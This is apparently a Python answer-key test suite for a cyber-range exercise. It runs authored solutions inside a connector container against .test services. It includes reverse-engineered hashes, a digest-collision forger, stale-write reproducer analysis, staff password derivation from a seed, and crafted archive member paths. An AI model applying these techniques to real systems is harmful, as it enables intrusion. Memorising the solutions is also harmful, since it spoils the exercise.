#!/usr/bin/env python3
"""Known-solution acceptance for every ARWC card (W01-W35).

This operator-only suite follows an authored solution sequence from the ARWC
participant boundary. The operator runner streams it into the supplied
connector workstation (`cinder-arwc-connector`) as user `fieldlink`, using the
corporate session and customer transition handover.

Boundary rules this suite enforces:
- It starts from the supplied connector handover: the `corporate-session` token
  and `customer-transition.json` under `/var/lib/fieldlink-connector/handover`.
- It derives every route host, record identifier, token and value from that
  handover or from an earlier response. It never embeds an author-only value.
- It carries response evidence forward across cards and operations.

The suite contains solution algorithms and expected assertions. Its passing
result proves known-path executability only; it does not prove that a fresh
person would discover or understand the path, or establish difficulty or
duration. It consumes single-use state and must run from a pristine range.
"""

from __future__ import annotations

import base64
import hashlib
import inspect
import json
import math
import os
import re
import struct
import subprocess
import time
import unittest
import uuid
from urllib.parse import quote, urlencode, urlsplit


CONTAINER = "cinder-arwc-connector"
HANDOVER = "/var/lib/fieldlink-connector/handover"
CA = "/tmp/arwc-ca.crt"
IN_PARTICIPANT_BOUNDARY = os.environ.get("CINDER_PARTICIPANT_BOUNDARY") == "1"
TRACE = os.environ.get("CINDER_ACCEPTANCE_TRACE") == "1"


def trace_event(kind: str, **fields: object) -> None:
    """Emit credential-free evidence for the operator-side acceptance runner."""
    if TRACE:
        frame = inspect.currentframe()
        test_method = "setup"
        while frame:
            if frame.f_code.co_name.startswith("test_"):
                test_method = frame.f_code.co_name
                break
            frame = frame.f_back
        print("CINDER_ACCEPTANCE_EVENT " + json.dumps(
            {"kind": kind, "test_method": test_method, **fields},
            sort_keys=True, separators=(",", ":"),
        ), flush=True)


def trace_artifact(source: str, value: bytes) -> None:
    trace_event(
        "artifact", source=source, bytes=len(value),
        sha256=hashlib.sha256(value).hexdigest(),
    )


def w08_gf_multiply(left: int, right: int) -> int:
    product = 0
    while right:
        if right & 1:
            product ^= left
        right >>= 1
        left <<= 1
        if left & 0x100:
            left ^= 0x11D
    return product


def w08_gf_power(value: int, exponent: int) -> int:
    result = 1
    for _ in range(exponent):
        result = w08_gf_multiply(result, value)
    return result


def w08_reconstruct(retained: dict[int, bytes]) -> tuple[bytes, bytes]:
    """Reconstruct the two declared missing RS(14,12) shards."""
    coefficients = {
        row: [w08_gf_power(2, row * column) for column in range(12)]
        for row in (12, 13)
    }
    residuals = {12: bytearray(retained[12]), 13: bytearray(retained[13])}
    for row in (12, 13):
        for column in range(12):
            if column in (7, 11):
                continue
            for offset, value in enumerate(retained[column]):
                residuals[row][offset] ^= w08_gf_multiply(coefficients[row][column], value)
    a, b = coefficients[12][7], coefficients[12][11]
    c, d = coefficients[13][7], coefficients[13][11]
    determinant = w08_gf_multiply(a, d) ^ w08_gf_multiply(b, c)
    inverse_det = w08_gf_power(determinant, 254)
    shard_7 = bytearray(96)
    shard_11 = bytearray(96)
    for offset in range(96):
        e, f = residuals[12][offset], residuals[13][offset]
        shard_7[offset] = w08_gf_multiply(
            w08_gf_multiply(d, e) ^ w08_gf_multiply(b, f), inverse_det,
        )
        shard_11[offset] = w08_gf_multiply(
            w08_gf_multiply(c, e) ^ w08_gf_multiply(a, f), inverse_det,
        )
    return bytes(shard_7), bytes(shard_11)


def w31_crc32c(data: bytes) -> int:
    value = 0xFFFFFFFF
    for octet in data:
        value ^= octet
        for _ in range(8):
            value = (value >> 1) ^ (0x82F63B78 if value & 1 else 0)
    return value ^ 0xFFFFFFFF


def w31_dvl1(payload: bytes, declared: int = 0xFE08, header: int = 0x01F8) -> bytes:
    if len(payload) != 500:
        raise AssertionError("DVL1 payload must be 500 bytes")
    return b"DVL1" + struct.pack("<HHI", declared, header, w31_crc32c(payload)) + payload


def w31_elf_symbol(binary: bytes, name: str) -> int:
    section_offset = struct.unpack_from("<Q", binary, 0x28)[0]
    section_size = struct.unpack_from("<H", binary, 0x3A)[0]
    section_count = struct.unpack_from("<H", binary, 0x3C)[0]
    sections = [
        struct.unpack_from("<IIQQQQIIQQ", binary, section_offset + index * section_size)
        for index in range(section_count)
    ]
    for section in sections:
        if section[1] not in (2, 11):
            continue
        strings = sections[section[6]]
        string_table = binary[strings[4]:strings[4] + strings[5]]
        for offset in range(section[4], section[4] + section[5], section[9]):
            name_offset, _, _, _, value, _ = struct.unpack_from("<IBBHQQ", binary, offset)
            end = string_table.find(b"\0", name_offset)
            if string_table[name_offset:end].decode(errors="replace") == name:
                return value
    raise AssertionError(f"ELF symbol {name} not found")


def w31_elf_string_vaddr(binary: bytes, needle: bytes) -> int:
    file_offset = binary.index(needle)
    program_offset = struct.unpack_from("<Q", binary, 0x20)[0]
    program_size = struct.unpack_from("<H", binary, 0x36)[0]
    program_count = struct.unpack_from("<H", binary, 0x38)[0]
    for index in range(program_count):
        header = struct.unpack_from("<IIQQQQQQ", binary, program_offset + index * program_size)
        if header[0] == 1 and header[2] <= file_offset < header[2] + header[5]:
            return header[3] + file_offset - header[2]
    raise AssertionError("history identifier is not in a loadable segment")


def w31_elf_posture(binary: bytes) -> tuple[bool, bool, bool]:
    pie = struct.unpack_from("<H", binary, 0x10)[0] == 3
    program_offset = struct.unpack_from("<Q", binary, 0x20)[0]
    program_size = struct.unpack_from("<H", binary, 0x36)[0]
    program_count = struct.unpack_from("<H", binary, 0x38)[0]
    nx = relro = bind_now = False
    for index in range(program_count):
        header = struct.unpack_from("<IIQQQQQQ", binary, program_offset + index * program_size)
        if header[0] == 0x6474E551:
            nx = not bool(header[1] & 1)
        elif header[0] == 0x6474E552:
            relro = True
        elif header[0] == 2:
            for offset in range(header[2], header[2] + header[5], 16):
                tag, value = struct.unpack_from("<QQ", binary, offset)
                if tag == 0:
                    break
                if tag == 24 or (tag == 30 and value & 8) or (tag == 0x6FFFFFFB and value & 1):
                    bind_now = True
    return pie, nx, relro and bind_now


def inside(*arguments: str, input_text: str | None = None) -> subprocess.CompletedProcess[str]:
    """Run a command inside the connector workstation as the participant user."""
    command = list(arguments) if IN_PARTICIPANT_BOUNDARY else [
        "docker", "exec", "-i", "--user", "fieldlink", "--workdir", "/var/lib/fieldlink-connector", CONTAINER, *arguments,
    ]
    return subprocess.run(
        command,
        input=input_text, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
    )


_REQUEST = r'''
import json
import re, pathlib, ssl, sys, tempfile, urllib.error, urllib.request
method, url, tenant, supplied, extra, body, certificate, private_key = sys.argv[1:]
if supplied == "@session":
    supplied = pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
headers = {"X-ARWC-Tenant": tenant}
if supplied:
    headers["Authorization"] = "Bearer " + supplied
for name, value in json.loads(extra).items():
    if value == "@planner":
        value = pathlib.Path("/var/lib/fieldlink-connector/receipts/planner-session").read_text().strip()
    elif value == "@planning":
        value = pathlib.Path("/var/lib/fieldlink-connector/receipts/planner-handover").read_text().strip()
    headers[name] = value
data = None if not body else body.encode()
if data is not None:
    headers["Content-Type"] = "application/json"
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
with tempfile.TemporaryDirectory() as directory:
    if certificate:
        cert_path = pathlib.Path(directory) / "client.crt"; cert_path.write_text(certificate)
        key_path = pathlib.Path(directory) / "client.key"; key_path.write_text(private_key)
        context.load_cert_chain(cert_path, key_path)
    try:
        response = urllib.request.urlopen(urllib.request.Request(url, data=data, headers=headers, method=method), context=context, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    print(response.status)
    print(response.read().decode())
'''


def request(url: str, *, method: str = "GET", body: dict | None = None,
            token: str | None = None, tenant: str = "arwc", expected: int | None = None,
            headers: dict | None = None, certificate: str = "", private_key: str = "") -> tuple[int, dict]:
    """Issue a request from the connector workstation with its CA and tenant header."""
    started = time.monotonic()
    completed = inside(
        "python3", "-c", _REQUEST, method, url, tenant,
        "@session" if token is None else token,
        json.dumps(headers or {}),
        "" if body is None else json.dumps(body, separators=(",", ":")),
        certificate, private_key,
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status_line, _, payload = completed.stdout.partition("\n")
    status = int(status_line)
    data = json.loads(payload) if payload.strip() else {}
    location = urlsplit(url)
    trace_event(
        "http", method=method, host=location.hostname or "",
        path_sha256=hashlib.sha256((location.path or "/").encode()).hexdigest(),
        status=status, response_bytes=len(payload.encode()),
        response_sha256=hashlib.sha256(payload.encode()).hexdigest(),
        elapsed_ms=round((time.monotonic() - started) * 1000),
    )
    if expected is not None and status != expected:
        raise AssertionError(f"{method} {url} -> {status} (want {expected}): {payload[:300]}")
    return status, data


_GET_BYTES = r'''
import base64, pathlib, ssl, sys, urllib.error, urllib.request
url, tenant, supplied = sys.argv[1:]
if supplied == "@session":
    supplied = pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
headers = {"X-ARWC-Tenant": tenant}
if supplied:
    headers["Authorization"] = "Bearer " + supplied
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try:
    response = urllib.request.urlopen(urllib.request.Request(url, headers=headers), context=context, timeout=30)
except urllib.error.HTTPError as error:
    response = error
print(response.status)
print(response.headers.get_content_type())
print(base64.b64encode(response.read()).decode())
'''


def get_bytes(url: str, *, token: str | None = None, tenant: str = "arwc", expected: int = 200) -> tuple[bytes, str]:
    """Fetch a binary artifact (not JSON) from the connector workstation."""
    started = time.monotonic()
    completed = inside("python3", "-c", _GET_BYTES, url, tenant, "@session" if token is None else token)
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status_line, content_type, encoded = completed.stdout.splitlines()
    if int(status_line) != expected:
        raise AssertionError(f"GET {url} -> {status_line} (want {expected})")
    value = base64.b64decode(encoded)
    location = urlsplit(url)
    trace_event(
        "http", method="GET", host=location.hostname or "",
        path_sha256=hashlib.sha256((location.path or "/").encode()).hexdigest(),
        status=int(status_line), response_bytes=len(value),
        response_sha256=hashlib.sha256(value).hexdigest(),
        elapsed_ms=round((time.monotonic() - started) * 1000),
    )
    return value, content_type


_NATIVE_REQUEST = r'''
import base64, http.cookiejar, json, pathlib, ssl, sys, urllib.error, urllib.parse, urllib.request
service, method, path, body, extra = sys.argv[1:]
context = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
token = pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
handover_request = urllib.request.Request(
    "https://customer-handover.arwc.test:8443/api/handovers/current",
    headers={"Authorization": "Bearer " + token, "X-ARWC-Tenant": "arwc"},
)
onboarding = json.loads(urllib.request.urlopen(handover_request, context=context).read())["record"]["supplier_onboarding"]
path = path.replace("{user}", urllib.parse.quote(onboarding["username"], safe=""))
headers = json.loads(extra)
data = None if not body else body.encode()
if service == "nextcloud":
    url = "https://documents.arwc.test" + path
    credentials = base64.b64encode((onboarding["username"] + ":" + onboarding["password"]).encode()).decode()
    headers["Authorization"] = "Basic " + credentials
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=context))
elif service == "erpnext":
    url = "https://suppliers.arwc.test" + path
    cookies = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies), urllib.request.HTTPSHandler(context=context))
    login = urllib.parse.urlencode({"usr": onboarding["username"], "pwd": onboarding["password"]}).encode()
    opener.open(urllib.request.Request("https://suppliers.arwc.test/api/method/login", data=login, method="POST"), timeout=30).read()
    if data is not None:
        headers.setdefault("Content-Type", "application/json")
elif service == "postgrest":
    url = "https://read-data.arwc.test" + path
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=context))
else:
    raise ValueError("unknown native service")
try:
    response = opener.open(urllib.request.Request(url, data=data, headers=headers, method=method), timeout=30)
except urllib.error.HTTPError as error:
    response = error
payload = response.read()
print(json.dumps({
    "status": response.status,
    "content_type": response.headers.get_content_type(),
    "body": base64.b64encode(payload).decode(),
}, separators=(",", ":")))
'''


def native_request(service: str, path: str, *, method: str = "GET", body: dict | bytes | None = None,
                   headers: dict[str, str] | None = None, expected: int | set[int] | None = None) -> tuple[int, bytes, str]:
    if isinstance(body, dict):
        encoded = json.dumps(body, separators=(",", ":"))
    elif isinstance(body, bytes):
        encoded = body.decode()
    else:
        encoded = ""
    completed = inside("python3", "-c", _NATIVE_REQUEST, service, method, path, encoded, json.dumps(headers or {}))
    if completed.returncode:
        raise AssertionError(completed.stderr)
    response = json.loads(completed.stdout)
    status = int(response["status"])
    allowed = {expected} if isinstance(expected, int) else expected
    if allowed is not None and status not in allowed:
        raise AssertionError(f"{service} {method} {path} -> {status} (want {sorted(allowed)})")
    value = base64.b64decode(response["body"])
    trace_event(
        "http", method=method, host=service,
        path_sha256=hashlib.sha256(path.encode()).hexdigest(), status=status,
        response_bytes=len(value), response_sha256=hashlib.sha256(value).hexdigest(),
    )
    return status, value, response["content_type"]


def native_json(service: str, path: str, *, method: str = "GET", body: dict | None = None,
                headers: dict[str, str] | None = None, expected: int | set[int] | None = None) -> tuple[int, dict]:
    status, value, _ = native_request(service, path, method=method, body=body, headers=headers, expected=expected)
    return status, json.loads(value) if value else {}


def erp_list(doctype: str, filters: dict, fields: list[str]) -> list[dict]:
    query = urlencode({"filters": json.dumps(filters), "fields": json.dumps(fields), "limit_page_length": 20})
    _, response = native_json("erpnext", f"/api/resource/{quote(doctype, safe='')}?{query}", expected=200)
    return response["data"]


def one(rows: list[dict], description: str) -> dict:
    if len(rows) != 1:
        raise AssertionError(f"expected one {description}, got {len(rows)}")
    return rows[0]


_MAKE_ARCHIVE = r'''
import base64, pathlib, subprocess, sys, tempfile
with tempfile.TemporaryDirectory() as directory:
    root = pathlib.Path(directory); member = sys.argv[1]
    target = root / member; target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("retained archive request\n")
    subprocess.run(["7zz", "a", str(root / "request.7z"), member], cwd=root, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(base64.b64encode((root / "request.7z").read_bytes()).decode())
'''


def make_archive(member: str) -> str:
    """Build a 7-Zip archive containing a single crafted member path (participant tool)."""
    completed = inside("python3", "-c", _MAKE_ARCHIVE, member)
    if completed.returncode:
        raise AssertionError(completed.stderr)
    return completed.stdout.strip()


_METABASE_SESSION = r'''
import hashlib, hmac, json, os, ssl, sys, urllib.error, urllib.request
seed = os.environ.get("STAFF_SEED", "")
if not seed:
    print(json.dumps({"error": "no STAFF_SEED"}))
    sys.exit(1)
email = "nadia.corvane@alterrawaterco.com"
password = hmac.new(seed.encode(), email.encode(), hashlib.sha256).hexdigest()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
req = urllib.request.Request(
    "https://reports.arwc.test/api/session",
    data=json.dumps({"username": email, "password": password}).encode(),
    headers={"Content-Type": "application/json"},
)
try:
    with urllib.request.urlopen(req, context=context, timeout=30) as resp:
        print(json.dumps({"id": json.load(resp)["id"]}))
except urllib.error.HTTPError as error:
    print(json.dumps({"error": f"HTTP {error.code}"}))
    sys.exit(1)
'''

_METABASE_REQUEST = r'''
import json, ssl, sys, urllib.error, urllib.request
method, url, session, body = sys.argv[1:]
headers = {"Content-Type": "application/json"}
if session:
    headers["X-Metabase-Session"] = session
data = None if not body else body.encode()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try:
    response = urllib.request.urlopen(
        urllib.request.Request(url, data=data, headers=headers, method=method), context=context, timeout=60
    )
except urllib.error.HTTPError as error:
    response = error
print(response.status)
print(response.read().decode())
'''


def metabase_session() -> str:
    """Return a Metabase session token for the planning user."""
    completed = inside("python3", "-c", _METABASE_SESSION)
    if completed.returncode:
        raise AssertionError(f"Metabase session setup failed: {completed.stderr}")
    result = json.loads(completed.stdout)
    if "error" in result:
        raise AssertionError(f"Metabase session failed: {result['error']}")
    return result["id"]


def metabase_request(path: str, *, method: str = "GET", body: dict | None = None,
                     session: str = "", expected: int | None = None) -> tuple[int, dict]:
    """Make a request to the Metabase API from inside the connector container."""
    completed = inside(
        "python3", "-c", _METABASE_REQUEST, method,
        f"https://reports.arwc.test{path}", session,
        "" if body is None else json.dumps(body, separators=(",", ":")),
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status_line, _, payload = completed.stdout.partition("\n")
    status = int(status_line)
    data = json.loads(payload) if payload.strip() else {}
    if expected is not None and status != expected:
        raise AssertionError(f"Metabase {method} {path} -> {status} (want {expected}): {payload[:300]}")
    return status, data


def cbor_text(value: str) -> bytes:
    """Encode a short text string in CBOR (participant tool, for the v2 field protocol)."""
    encoded = value.encode()
    if len(encoded) < 24:
        return bytes([0x60 + len(encoded)]) + encoded
    if len(encoded) < 256:
        return b"\x78" + bytes([len(encoded)]) + encoded
    raise ValueError("text too long")


def cbor_map(value: dict[str, str]) -> bytes:
    if len(value) >= 24:
        raise ValueError("map too large")
    return bytes([0xA0 + len(value)]) + b"".join(cbor_text(k) + cbor_text(v) for k, v in value.items())


def cbor_request(url: str, body: bytes, token: str, *, expected: int | None = None) -> tuple[int, dict]:
    """POST a raw CBOR body with a bearer token (the field gateway's v2 protocol)."""
    started = time.monotonic()
    script = (
        "import json, ssl, sys, urllib.error, urllib.request\n"
        "url, token = sys.argv[1:]\n"
        "data = sys.stdin.buffer.read()\n"
        'headers = {"Authorization": "Bearer " + token, "X-ARWC-Tenant": "arwc", "Content-Type": "application/cbor"}\n'
        "context = ssl.create_default_context(cafile='/tmp/arwc-ca.crt')\n"
        "try: response = urllib.request.urlopen(urllib.request.Request(url, data=data, headers=headers, method='POST'), context=context)\n"
        "except urllib.error.HTTPError as error: response = error\n"
        "print(response.status); print(response.read().decode())\n"
    )
    completed = inside_bytes("python3", "-c", script, url, token, input_bytes=body)
    if completed.returncode:
        raise AssertionError(completed.stderr.decode())
    status_line, _, payload = completed.stdout.decode().partition("\n")
    status = int(status_line)
    data = json.loads(payload) if payload.strip() else {}
    location = urlsplit(url)
    trace_event(
        "http", method="POST", host=location.hostname or "",
        path_sha256=hashlib.sha256((location.path or "/").encode()).hexdigest(),
        status=status, response_bytes=len(payload.encode()),
        response_sha256=hashlib.sha256(payload.encode()).hexdigest(),
        elapsed_ms=round((time.monotonic() - started) * 1000),
    )
    if expected is not None and status != expected:
        raise AssertionError(f"POST {url} -> {status} (want {expected}): {payload[:300]}")
    return status, data


def w19_rotl(value: int, count: int, width: int) -> int:
    mask = (1 << width) - 1
    return ((value << count) | (value >> (width - count))) & mask


def w19_rolling(record: str) -> int:
    """The binary's rolling hash, recovered by reading its disassembly (participant tool)."""
    mask32 = (1 << 32) - 1
    value = 0x6D2B79F5
    for byte in record.encode():
        value = (w19_rotl((value ^ byte) & mask32, 5, 32) + 0x9E3779B9) & mask32
    return value


def w19_verifier(record: str) -> int:
    mask64 = (1 << 64) - 1
    value = w19_rolling(record)
    return w19_rotl(0x243F6A8885A308D3 ^ ((value * 0x100000001B3) & mask64), 9, 64) ^ value


def w22_run_vm(program: bytes) -> tuple[list[int], bytes, int]:
    """Reimplementation of the sealed viewer's small bytecode VM (recovered by disassembly)."""
    registers = [0, 0, 0, 0]
    memory = bytearray(256)
    zero = False
    pc = steps = 0
    while 0 <= pc < len(program) // 6 and steps < 4096:
        opcode, dst, src, immediate = struct.unpack_from("<HBBH", program, pc * 6)
        steps += 1
        if opcode == 1:
            registers[dst] = immediate; zero = registers[dst] == 0; pc += 1
        elif opcode == 2:
            registers[dst] = memory[(registers[src] + immediate) & 255]; zero = registers[dst] == 0; pc += 1
        elif opcode == 3:
            registers[dst] = (registers[dst] ^ registers[src] ^ immediate) & 65535; zero = registers[dst] == 0; pc += 1
        elif opcode == 4:
            registers[dst] = (registers[dst] + registers[src] + immediate) & 65535; zero = registers[dst] == 0; pc += 1
        elif opcode == 5:
            shift = immediate & 15; value = registers[src]
            registers[dst] = value if not shift else ((value << shift) | (value >> (16 - shift))) & 65535
            zero = registers[dst] == 0; pc += 1
        elif opcode == 6:
            memory[(registers[dst] + immediate) & 255] = registers[src] & 255; pc += 1
        elif opcode == 7:
            pc = pc + struct.unpack("<h", struct.pack("<H", immediate))[0] if not zero else pc + 1
        elif opcode == 255:
            break
        else:
            raise AssertionError(opcode)
    return registers, bytes(memory), steps


def w22_public(program: bytes) -> dict:
    registers, memory, steps = w22_run_vm(program)
    return {"registers": registers, "memory_40_80_sha256": hashlib.sha256(memory[0x40:0x80]).hexdigest(), "steps": steps}


def w22_recover_reviewer(helper: bytes, visible_reviewer: str) -> str:
    """Recover the deployed ReadyToRun reviewer from native immediate chunks."""
    native_chunks: list[str] = []
    for match in re.finditer(rb"\x48\xb8(.{8})\xc3", helper, re.DOTALL):
        try:
            value = match.group(1).decode("utf-16le")
        except UnicodeDecodeError:
            continue
        if len(value) == 4 and all(0x20 <= ord(character) < 0x7f for character in value):
            native_chunks.append(value)
    all_chunks = {
        helper[offset:offset + 8].decode("utf-16le")
        for offset in range(len(helper) - 7)
        if all(helper[offset + index] == 0 for index in (1, 3, 5, 7))
        and all(0x20 <= helper[offset + index] < 0x7f for index in (0, 2, 4, 6))
    }
    suffix = visible_reviewer.rsplit("-", 1)[-1]
    candidates: set[str] = set()
    for index in range(len(native_chunks) - 2):
        prefix = "".join(native_chunks[index:index + 3])
        for chunk in all_chunks:
            for final in range(0x20, 0x7f):
                candidate = prefix + chunk + chr(final)
                if (len(candidate) == len(visible_reviewer)
                        and candidate.endswith("-" + suffix)
                        and candidate != visible_reviewer
                        and re.fullmatch(r"[a-z][a-z.]+-[a-z]+", candidate)):
                    candidates.add(candidate)
    if len(candidates) != 1:
        raise AssertionError(
            f"W22 reviewer derivation failed: expected one native candidate, found {len(candidates)}"
        )
    return candidates.pop()


def w23_analyze_reproducer(output: str, ordinary: dict[str, object], district: str) -> dict[str, object]:
    """Derive the estimator layout and control fields from raw reproducer snapshots."""
    fields = dict(line.split("=", 1) for line in output.splitlines() if "=" in line)
    try:
        stale = bytes.fromhex(fields["stale"])
        replacement = bytes.fromhex(fields["replacement"])
        probe = fields["probe"]
        allocation_case = fields["case"]
    except (KeyError, ValueError) as error:
        raise AssertionError(f"W23 estimator derivation failed: malformed reproducer output: {error}") from error
    if not stale or len(stale) != len(replacement):
        raise AssertionError("W23 estimator derivation failed: allocation snapshots disagree")
    controlled = [index for index, value in enumerate(stale) if value]
    if not controlled or controlled != list(range(controlled[0], controlled[-1] + 1)):
        raise AssertionError("W23 estimator derivation failed: stale write is not a single field")
    controlled_offset = controlled[0]
    controlled_bytes = stale[controlled_offset:controlled[-1] + 1]
    if len(controlled_bytes) != 4:
        raise AssertionError("W23 estimator derivation failed: stale control field is not u32")
    district_offset = replacement.find(district.encode() + b"\0")
    ordinary_key = next((key for key in ordinary if district.startswith(str(key))), None)
    if district_offset < 0 or ordinary_key is None:
        raise AssertionError("W23 estimator derivation failed: district or baseline reserve is absent")
    reserve_bytes = struct.pack("<d", float(ordinary[ordinary_key]))
    reserve_offsets = [
        offset for offset in range(len(replacement) - len(reserve_bytes) + 1)
        if replacement[offset:offset + len(reserve_bytes)] == reserve_bytes
    ]
    quality_bytes = struct.pack("<I", 1)
    quality_offsets = [
        offset for offset in range(len(replacement) - len(quality_bytes) + 1)
        if replacement[offset:offset + len(quality_bytes)] == quality_bytes
    ]
    if len(reserve_offsets) != 1 or len(quality_offsets) != 1:
        raise AssertionError("W23 estimator derivation failed: protected fields are ambiguous")
    return {
        "allocation_size": len(stale),
        "controlled_offset": controlled_offset,
        "controlled_u32": struct.unpack("<I", controlled_bytes)[0],
        "district_offset": district_offset,
        "reserve_offset": reserve_offsets[0],
        "quality_offset": quality_offsets[0],
        "quality": struct.unpack_from("<I", replacement, quality_offsets[0])[0],
        "probe": probe,
        "allocation_case": allocation_case,
        "unaffected": {
            str(key): value for key, value in ordinary.items()
            if not district.startswith(str(key)) and key != "quality"
        },
    }


def w24_selector_from_disassembly(disassembly: str, cases: list[dict[str, object]]):
    """Recover the selector constants and shifts, selecting the unique model proved by cases."""
    constants = {
        int(value, 16)
        for value in re.findall(r"movabs\s+\$0x([0-9a-f]+)", disassembly)
    }
    left_shifts = {int(value, 16) for value in re.findall(r"shl\s+\$0x([0-9a-f]+)", disassembly)}
    right_shifts = {int(value, 16) for value in re.findall(r"shr\s+\$0x([0-9a-f]+)", disassembly)}
    mask = (1 << 64) - 1
    models = []
    for request_constant in constants:
        for epoch_constant in constants - {request_constant}:
            for left_shift in left_shifts:
                for request_shift in right_shifts:
                    for epoch_shift in right_shifts:
                        def candidate(request_id: int, epoch_bucket: int, *, rc=request_constant,
                                      ec=epoch_constant, ls=left_shift, rs=request_shift,
                                      es=epoch_shift) -> int:
                            x = (request_id ^ rc) & mask
                            y = (epoch_bucket ^ ec) & mask
                            x = (x ^ ((x << ls) & mask)) & mask
                            return ((x ^ y ^ (x >> rs) ^ (y >> es)) + y) & mask

                        if all(
                            candidate(int(str(case["request_id"]), 16), int(case["epoch_bucket"])) & 3
                            == case["rotation"]
                            for case in cases
                        ):
                            models.append((candidate, {
                                "request_constant": request_constant,
                                "epoch_constant": epoch_constant,
                                "left_shift": left_shift,
                                "request_shift": request_shift,
                                "epoch_shift": epoch_shift,
                            }))
    if len(models) != 1:
        raise AssertionError(
            f"W24 selector derivation failed: expected one validated model, found {len(models)}"
        )
    return models[0]


MASK128 = (1 << 128) - 1
ROT128_IV = int("6a09e667f3bcc908bb67ae8584caa73b", 16)


def w27_rotl128(value: int, count: int) -> int:
    return ((value << count) | (value >> (128 - count))) & MASK128


def w27_rot128(data: bytes) -> int:
    """The native verifier's digest, recovered by reversing its binary (participant tool)."""
    length = len(data)
    material = data + b"\x80"
    material += b"\0" * ((-len(material)) % 16)
    state = ROT128_IV
    for offset in range(0, len(material), 16):
        block = int.from_bytes(material[offset:offset + 16], "little")
        state = w27_rotl128(state, 17) ^ block ^ w27_rotl128(block, 41)
    return (state ^ w27_rotl128(state, 29) ^ length) & MASK128


def w27_solve_collision(seed: bytes, base: bytes, reservoir_bits: list[int]) -> bytes:
    """Find a non-identical input with the same rot128 digest as `base`, by
    treating candidate single-bit flips as a GF(2) linear system."""
    target = w27_rot128(seed) ^ w27_rot128(base)
    basis: dict[int, tuple[int, int]] = {}
    for bit in reservoir_bits:
        changed = bytearray(seed); changed[bit // 8] ^= 1 << (bit % 8)
        vector, mask = w27_rot128(bytes(changed)) ^ w27_rot128(seed), 1 << bit
        while vector:
            pivot = vector.bit_length() - 1
            if pivot in basis:
                vector ^= basis[pivot][0]; mask ^= basis[pivot][1]
            else:
                basis[pivot] = vector, mask
                break
    solution, vector = 0, target
    while vector:
        pivot = vector.bit_length() - 1
        if pivot not in basis:
            raise AssertionError(f"GF(2) system cannot reduce pivot {pivot}")
        vector ^= basis[pivot][0]; solution ^= basis[pivot][1]
    candidate = bytearray(seed)
    for bit in reservoir_bits:
        if solution & (1 << bit):
            candidate[bit // 8] ^= 1 << (bit % 8)
    result = bytes(candidate)
    if result == base or w27_rot128(result) != w27_rot128(base):
        raise AssertionError("collision solver did not produce a non-identical collision")
    return result


def crc32c(value: bytes) -> int:
    crc = 0xFFFFFFFF
    for byte in value:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ (0x82F63B78 if crc & 1 else 0)
    return crc ^ 0xFFFFFFFF


def write_receipt(name: str, value: str) -> None:
    """Save a recovered token into the participant's receipts directory."""
    result = inside("sh", "-c", f"umask 077; cat > /var/lib/fieldlink-connector/receipts/{name}", input_text=value)
    if result.returncode:
        raise AssertionError(result.stderr)


def inside_bytes(*arguments: str, input_bytes: bytes | None = None) -> subprocess.CompletedProcess:
    """Run a command inside the workstation and return raw (undecoded) output."""
    command = list(arguments) if IN_PARTICIPANT_BOUNDARY else [
        "docker", "exec", "-i", "--user", "fieldlink", CONTAINER, *arguments,
    ]
    return subprocess.run(
        command,
        input=input_bytes,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
    )


def write_bytes(path: str, data: bytes, *, mode: str = "0700") -> None:
    """Write raw bytes to a path inside the connector workstation."""
    result = inside_bytes(
        "sh", "-c", f"umask 077; cat > {path} && chmod {mode} {path}",
        input_bytes=data,
    )
    if result.returncode:
        raise AssertionError(result.stderr.decode())


def read_handover(name: str) -> str:
    result = inside("cat", f"{HANDOVER}/{name}")
    if result.returncode:
        raise AssertionError(f"handover file not found: {name}: {result.stderr}")
    trace_artifact(f"{HANDOVER}/{name}", result.stdout.encode())
    return result.stdout


class ARWCKnownSolutionAcceptance(unittest.TestCase):
    """One connected known-solution sequence with shared response evidence."""

    maxDiff = None
    evidence: dict[str, object] = {}

    @classmethod
    def setUpClass(cls) -> None:
        # The participant is handed the corporate session and the transition note.
        cls.transition = json.loads(read_handover("customer-transition.json"))
        # Crawl client references starting from the transition's discovery entry point.
        first_ref = cls.transition.get("client_reference")
        cls._routes: dict[str, str] = {}
        if first_ref:
            visited: set[str] = set()
            queue = [first_ref]
            while queue:
                url = queue.pop(0)
                if url in visited:
                    continue
                visited.add(url)
                _, doc = request(url, expected=200)
                if isinstance(doc, dict):
                    for route in doc.get("routes", []):
                        cls._routes[route["key"]] = route["template"]
                    for link in doc.get("related", []):
                        if link not in visited:
                            queue.append(link)

    @classmethod
    def discovered_route(cls, key: str) -> str:
        """Resolve a route template from the linked client reference graph."""
        if key not in cls._routes:
            raise AssertionError(f"route not in discovered client references: {key}")
        return cls._routes[key]

    @classmethod
    def host(cls, key: str) -> str:
        """Resolve a service base URL from the supplied customer transition note."""
        value = cls.transition.get(key)
        if not value:
            raise AssertionError(f"service not listed in customer transition: {key}")
        return value

    # ------------------------------------------------------------------ W01
    def test_w01_customer_copy(self) -> None:
        with self.subTest(card="W01.1 the customer's copy"):
            status, response = request(self.discovered_route("corporate.handover"), expected=200)
            record = response["record"]
            self.assertEqual(record["tenant"], self.transition["tenant"])
            self.assertEqual(record["active_connector"], self.transition["active_connector"])
            self.assertEqual(record["maintenance_case"], record["supplier_onboarding"]["maintenance_case"])
